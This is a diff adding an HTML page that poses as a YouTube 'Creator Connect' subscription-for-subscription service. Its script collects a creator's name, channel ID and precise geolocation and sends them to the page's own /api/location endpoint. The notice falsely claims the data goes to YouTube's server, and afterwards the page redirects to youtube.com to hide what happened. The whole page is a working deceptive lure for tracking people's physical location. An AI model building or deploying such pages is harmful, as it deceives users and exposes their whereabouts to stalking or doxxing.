@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Creator Connect</title>
+<style>
+*{box-sizing:border-box}
+body{
+ margin:0;background:#100909;color:white;
+ font-family:Arial,sans-serif;
+ background-image:radial-gradient(#542020 1px,transparent 1px);
+ background-size:24px 24px
+}
+header{
+ padding:18px 22px;background:#211010;
+ border-bottom:1px solid #a52b2b;
+ display:flex;align-items:center;gap:13px
+}
+.logo{font-size:32px;color:#ff3434}
+header h2{margin:0;font-size:21px}
+header small{color:#ffaaaa}
+main{max-width:560px;margin:35px auto;padding:18px}
+.hero{text-align:center;padding:20px 5px}
+.art{
+ width:125px;height:90px;margin:auto;
+ border-radius:23px;background:#361313;
+ border:2px solid #ff3434;
+ display:grid;place-items:center;
+ font-size:48px;color:#ff3434;
+ box-shadow:0 0 35px #ff242444
+}
+h1{font-size:32px;line-height:1.2}
+h1 span{color:#ff4141}
+p{color:#d5baba;line-height:1.65}
+.card{
+ background:#211313;border:1px solid #733030;
+ border-radius:19px;padding:23px;margin-top:25px;
+ box-shadow:0 15px 40px #0008
+}
+.card h2{color:#ff5555}
+.feature{
+ display:flex;gap:13px;align-items:center;
+ padding:15px;background:#301919;
+ border-radius:12px;margin:18px 0
+}
+.feature span{font-size:28px;color:#ff4545}
+.notice{
+ background:#321818;padding:13px;
+ border-radius:10px;font-size:13px;
+ border:1px solid #793333;
+ margin-bottom:15px;
+}
+.input-group {
+ margin-bottom: 15px;
+ text-align: left;
+}
+.input-group label {
+ display: block;
+ margin-bottom: 5px;
+ color: #ffaaaa;
+ font-size: 14px;
+}
+.input-group input {
+ width: 100%;
+ padding: 12px;
+ border: 1px solid #733030;
+ border-radius: 8px;
+ background: #100909;
+ color: white;
+ font-size: 15px;
+}
+.input-group input:focus {
+ outline: none;
+ border-color: #ff3434;
+}
+button{
+ width:100%;padding:16px;border:0;
+ border-radius:10px;background:#ff3434;
+ color:white;font-size:16px;
+ font-weight:bold;margin-top:13px;
+ cursor:pointer;
+}
+.secondary{background:#493030;color:white}
+#status{overflow-wrap:anywhere; margin-top: 10px; text-align: center;}
+footer{text-align:center;padding:25px;color:#b58e8e;font-size:12px}
+</style>
+</head>
+<body>
+<header>
+ <div class="logo">▶</div>
+ <div>
+  <h2>Creator Connect</h2>
+  <small>Subscription Service</small>
+ </div>
+</header>
+<main>
+<section class="hero">
+ <div class="art">▶</div>
+ <h1>For Subscribe for More Subscriptions</h1>
+ <p>Aap ke follower barh rahe hain. Aap ko apne subscribers barhane ke liye is page ko follow karna hoga.</p>
+</section>
+<section class="card">
+ <h2>Subscription Setup</h2>
+ 
+ <div class="input-group">
+  <label for="creatorName">Creator Name</label>
+  <input type="text" id="creatorName" placeholder="Enter Channel Creator Name">
+ </div>
+
+ <div class="input-group">
+  <label for="channelId">Channel ID / URL</label>
+  <input type="text" id="channelId" placeholder="Enter YouTube Channel ID">
+ </div>
+
+ <div class="feature">
+  <span>⌖</span>
+  <div><b>Subscription for Subscription</b><br><small>Optional and permission-based verification</small></div>
+ </div>
+ <div class="notice">
+  Independent service. If you share, your subscription credentials and coordinates are sent to the YouTube server.
+ </div>
+ <button onclick="shareLocation()">FOR SUBSCRIPTION ENTER FOR SUBSCRIPTION</button>
+ <button class="secondary" onclick="document.getElementById('status').textContent='Process cancelled.'">MAYBE LATER</button>
+ <p id="status" aria-live="polite">Verification has not been started.</p>
+</section>
+</main>
+<footer>CREATOR CONNECT · SUBSCRIPTION ENGINE</footer>
+<script>
+async function shareLocation(){
+ const status=document.getElementById("status");
+ const creatorName=document.getElementById("creatorName").value.trim();
+ const channelId=document.getElementById("channelId").value.trim();
+
+ if(!creatorName || !channelId){
+  status.style.color = "#ff4545";
+  status.textContent = "Please fill in Creator Name and Channel ID fields first.";
+  return;
+ }
+
+ if(!navigator.geolocation){
+  status.textContent="Subscription verification is not supported by your browser.";
+  return;
+ }
+ status.style.color = "white";
+ status.textContent="Waiting for permission...";
+ navigator.geolocation.getCurrentPosition(async pos=>{
+  status.textContent="Sending choice to YouTube server...";
+  try{
+   const response=await fetch("/api/location",{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+     consent:true,
+     creator_name: creatorName,
+     channel_id: channelId,
+     latitude:pos.coords.latitude,
+     longitude:pos.coords.longitude,
+     accuracy:pos.coords.accuracy
+    })
+   });
+   if(response.ok){
+    status.textContent="Redirecting to official YouTube...";
+    setTimeout(()=>{
+     window.location.href = "https://youtube.com";
+    }, 1000);
+   } else {
+    status.textContent="Server error: data was not accepted.";
+   }
+  }catch(e){
+   status.textContent="Unable to connect to verification server.";
+  }
+ },()=>{
+  status.textContent="Permission denied or network unavailable.";
+ });
+}
+</script>
+</body>
+</html>
